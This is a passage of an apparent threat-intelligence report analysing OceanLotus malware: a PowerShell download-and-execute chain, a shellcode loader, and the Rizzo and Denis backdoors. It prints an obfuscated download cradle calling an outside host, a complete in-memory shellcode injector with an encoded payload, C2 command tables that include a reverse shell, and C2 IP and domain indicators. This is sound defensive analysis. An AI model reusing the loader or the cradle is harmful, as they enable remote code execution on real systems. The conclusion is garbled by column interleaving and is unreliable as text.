Windows PowerShell/PowerShell ID [600] :EventData/Data -> [0] Variable[1] Started[2] ProviderName=Variable NewProviderState=Started SequenceNumber=11 HostName=ConsoleHost HostVersion=4.0 HostId=fcb07468-ed83-4082-b089-e92e26b6ed33 HostApplication=POwersheLL -NOex -wInDOwSTYL HiDDen -nOLOgo -EXECUtIoNpOl BYPaSs -NOPr -nOninTERacti -Comman  . ((geT-vARiAble ‘*mDR*’).namE[3-11-2]-JoiN’’) (“ $( SeT  ‘Ofs’  ‘’ ) “+[STriNg]( (82- 94 - 67-59-51 - 51- 117-126 -108- 54- 116 -121 -113 - 126 -120 - 111 -59 -117-126-111 -53 -108 - 126 -121- 120 - 119 - 114- 126 -117- 111-50 -53 -127 -116 -108-117-119- 116 -122 - 127- 104- 111 - 105-114 - 117- 124 - 51-60- 115- 111 - 111- 107 - 33- 52 - 52-122-127-104-111 - 105 - 114 - 107- 104 -111 -105- 122 - 109- 126 -119 - 53 -120-116 -118-52 - 110 - 104-126-105 -53 - 114- 120-116- 60 -50- 50) |foReACH { [char] ( $_ -bxoR 0x1b  )})+” $(set  ‘OfS’  ‘ ‘)”) EngineVersion= RunspaceId= PipelineId= CommandName= CommandType= ScriptName= CommandPath= CommandLine=- EventData/Binary -> empty

The decoded PowerShell evaluates to:

IEX((new-objectnet.webclient).downloadstring(‘http://adstripstravel.com/resources/images/ img.png’))

Behavior
The downloaded payload was ultimately executed as a service to maintain persistence:

System/Service Control Manager ID [7045] :EventData/Data -> ServiceName = b8d0bfd ImagePath = %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -encodedcommand <Base64 encoded command>

The Base64 encoded command from the event decodes to:

Set-StrictMode -Version 2
 
$DoIt = @’
function func_get_proc_addre   ss {
    Param ($var_module, $var_procedure)    
    $var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split(‘\\’)[-1].Equals(‘System.dll’) }).GetType(‘Microsoft. Win32.UnsafeNativeMethods’)
     
    return $var_unsafe_native_methods.GetMethod(‘GetProcAddress’).Invoke($null, @([System.Runtime. InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod(‘GetModuleHandle’)).Invoke($null, @($var_module)))), $var_ procedure))

}

 
function func_get_delegate_type {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
        [Parameter(Position = 1)] [Type] $var_return_type = [Void]
    )
     
    $var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System. Reflection.AssemblyName(‘ReflectedDelegate’)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run). DefineDynamicModule(‘InMemoryModule’, $false).DefineType(‘MyDelegateType’, ‘Class, Public, Sealed, AnsiClass, AutoClass’, [System.MulticastDelegate])
    $var_type_builder.DefineConstructor(‘RTSpecialName, HideBySig, Public’, [System.Reflection. CallingConventions]::Standard, $var_parameters).SetImplementationFlags(‘Runtime, Managed’)
    $var_type_builder.DefineMethod(‘Invoke’, ‘Public, HideBySig, NewSlot, Virtual’, $var_return_ type, $var_parameters).SetImplementationFlags(‘Runtime, Managed’)
     
    return $var_type_builder.CreateType()
}

 
[Byte[]]$var_code = [System.Convert]::FromBase64String(“/OiJAAAAYInlMdJki1Iwi1IMi1IUi3IoD7dKJjH/ McCsPGF8Aiwgwc8NAcfi8FJXi1IQi0I8AdCLQHiFwHRKAdBQi0gYi1ggAdPjPEmLNIsB1jH/McCswc8NAcc44HX0A334O30k deJYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS64ZdMcBqQGgAEAAAaP//BwBqAGhYpFPl/9VQ6agAAAB aMclRUWgAsAQAaACwBABqAWoGagNSaEVw39T/1VCLFCRqAFJoKG994v/VhcB0bmoAagBqAInmg8YEieKDwgiLfCQMagBWag RSV2itnl+7/9WLVCQQagBWaAAgAABSV2itnl+7/9WFwHQUi0wkBIsEJAHIiQQki1QkEAHC69eLfCQMV2jA+t38/9VXaMaWh 1L/1YsEJItMJAg5wXQHaPC1olb/1f9kJBDoU////1xcLlxwaXBlXHN0YXR1c180NTk4AA==”)
         
$var_buffer = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_ proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $var_code.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)
 
$var_hthread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_ proc_address kernel32.dll CreateThread), (func_get_delegate_type @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$var_buffer,[IntPtr]::Zero,4, [IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll WaitForSingleObject), (func_get_delegate_type @([IntPtr], [Int32]))).Invoke($var_ hthread,0xffffffff) | Out-Null
‘@
 
If ([IntPtr]::size -eq 8) {
    start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job
}

else {
    IEX $DoIt
}

The above code is used to execute arbitrary shellcode, and appears to be based on exec-sc.ps1 from DKMC (Don’t Kill My Cat):
https:/github.com/Exploit-install/DKMC/blob/master/core/util/exec-sc.ps1
The injected shellcode payload (stored in $var_code) creates a named pipe called “\\.\pipe\status_4598”:

Any data read from the named pipe is executed directly as shellcode, allowing the threat actor to deploy additional payloads.

Rizzo
Classification Malware/Backdoor
Aliases PHOREAL (FireEye)
Size 304KB
Type Win32 PE (DLL)
File Name mobsync.exe
Observed 2018

Overview
Rizzo is a very simple backdoor that is capable of creating a reverse shell, performing simple file I/O and top-level window enumeration. It communicates to a list of four preconfigured C2 servers via ICMP on port 53.
Behavior
Upon execution of the exported “DllEntry” function, Rizzo proceeds to initialize Winsock 2.2 before creating a run once mutex:

Local\\{5FBC3F53-A76D-4248-969A-31740CBC8AD6}

The malware then tries to resolve the hardcoded C2 domain names. The list of domains are stored in an RC4 encrypted RT_ RCDATA/2 resource.

The backdoor also sets two values, “T” and “U”, under the HKCU\SOFTWARE\Microsoft\SkyDrive\{87F4F1B2-824E-420F-8B48- 4E8B575C2A7B} registry key. The registry path is stored as a stack-based, RC4 encrypted string:

C2
Protocol
In order to bypass firewalls and fly under the radar, the backdoor uses the ICMP protocol to communicate with the C2 server.

The C2 command packets have the following format:
Offset Size Description
0x0000 4 bytes Magic, or session ID
0x0004 4 bytes Command code
0x0008 variable Command parameters

The backdoor response header consists of the following information:
Offset Size Description
0x0000 4 bytes Magic/ID (copied from the request)
0x0004 4 bytes Length of header (hardcoded 0x0C)
0x0008 4 bytes Error code
0x000C 4 bytes Original data size
0x0010 4 bytes Compressed data size
0x0014 Variable Compressed response

Commands
Command Code Parameters Description
3 Application name Create process

Command line
4 Path Copy specified file to %TEMP% folder
5 Command line Reverse shell
6 File name Decompress data sent by C2 and write it to a specified file on disk

Compressed data
7 Value data Set registry value “U” under SOFTWARE\Microsoft\SkyDrive\ {87F4F1B2-824E-420F-8B48-4E8B575C2A7B} key to provided data
8 - Enumerate windows
15 Path Directory listing
16 Existing file path Move file

New file path
17 Path Delete file
18 - Get logical drives
19 Path Create directory
20 Path Remove directory

Denis
Classification Malware/Backdoor
Aliases SOUNDBITE (FireEye)
Size < 300KB
Type Win32 PE (EXE)
File Name CiscoEapFast.exe, WerFault.exe, SwUSB.exe, msprivs.exe, SndVolSSO.exe
Observed 2016

Overview
Denis is a simple backdoor developed by the OceanLotus Group, well observed in-the-wild and renowned for using DNS tunneling as a transport mechanism for C2 communications.
Denis is typically deployed early in the attack lifecycle, and it appears to be less tailored/targeted than the more advanced backdoors that are utilized once a foothold has been established within an environment.
Behavior
Upon execution, Denis imports the bulk of its runtime APIs dynamically, with the DLL and function names encoded as stack- based strings:

These UNICODE strings are decoded using byte level add/subtract, depending on the variant:

This technique is used heavily amongst APT32 backdoors (for example Remy below):

After importing APIs, Denis will typically create a mutex to prevent multiple instances running, before decoding the DNS names used for C2 tunneling in much the same way as API/function names:

After decoding and reading configuration stored in the registry, Denis will create a thread to communicate with the C2 server, typically supporting the following commands:

Command Code Description
0x01 Load DLL and run exported function
0x02 Unload DLL
0x03 Create process (hidden)
0x04 Read file
0x05 Run cmd.exe with redirected stdout
0x06/0x07 Write file
0x0a Enumerate windows
0x0b Set registry value
0x0c Get registry value
0x0f List directory
0x10 Move file
0x11 Delete file
0x12 Get logical drive information
0x13 Create directory
0x14 Delete directory

C2 data is Base64 encoded and prepended to one of several configured domain names, before being transmitted via DNS request, typically routed via a DNS forwarder:

Denis samples have been observed using a variety of forwarders and name servers for C2, as well as using NULL/TEXT/CNAME records to embed encoded data, depending on configuration.

Network Intelligence
Network intelligence was initially obtained during November 2017.
167.114.44.146
All C2 domains were registered using Privacy Guardian on August 21, 2017. All host names resolve to the same Canadian IP address (167.114.44.146).

Conclusions
OceanLotus employs both home-brew and off-the-shelf RATs. The Roland and Remy trojans share similarities and some They use PowerShell scripts from open-source exploit kits, code re-use with other known OceanLotus malware. The including MSFvenom, Veil, and DKMC, to load shellcode and overall design and development of these threats indicate they DLL payloads into memory. C2 functionality is customized come from a well-funded development team. The OceanLotus to the target, and all domains are registered through an Group uses an expansive amount of custom library code that anonymization service called PrivacyGuardian.  can easily be repurposed for maximum effectiveness against their next target.